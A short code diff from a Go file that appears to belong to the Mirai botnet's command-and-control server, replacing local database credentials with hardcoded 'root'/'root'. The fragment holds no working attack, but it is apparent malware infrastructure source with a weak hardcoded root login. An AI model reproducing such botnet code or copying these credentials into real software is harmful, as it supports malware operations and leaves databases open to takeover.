@@ -8,8 +8,8 @@ import (
 )
 
 const DatabaseAddr string   = "127.0.0.1"
-const DatabaseUser string   = "localuser"
-const DatabasePass string   = "localuserpassword"
+const DatabaseUser string   = "root"
+const DatabasePass string   = "root"
 const DatabaseTable string  = "mirai"
 
 var clientList *ClientList = NewClientList()
